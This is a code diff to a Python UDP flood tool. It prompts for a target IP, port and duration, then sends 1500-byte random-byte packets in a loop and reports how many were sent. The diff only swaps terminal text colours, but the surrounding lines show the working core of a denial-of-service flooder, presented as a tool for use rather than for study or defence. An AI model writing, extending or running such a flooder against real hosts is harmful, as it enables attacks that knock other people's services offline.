@@ -20,7 +20,7 @@ colorama.init(autoreset=True)
 sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 bytes = random._urandom(1500)
 Print("")
-ip = input(f"{Fore.CYAN} - Enter Target IP : ")
+ip = input(f"{Fore.YELLOW} - Enter Target IP : ")
 port = int(input("       - Enter Target Port (Defult 80) : "))
 dur = int(input("        - Enter Time Duration (1~100000) : "))
 timeout = time.time() + dur
@@ -36,6 +36,6 @@ while True :
         print("sent",sent,"packets to",ip,"through port",port,)
     except KeyboardInterrupt:
         sys.exit()
-print(f"""{Fore.RED}
+print(f"""{Fore.BLUE}
     Done Send !
 """)
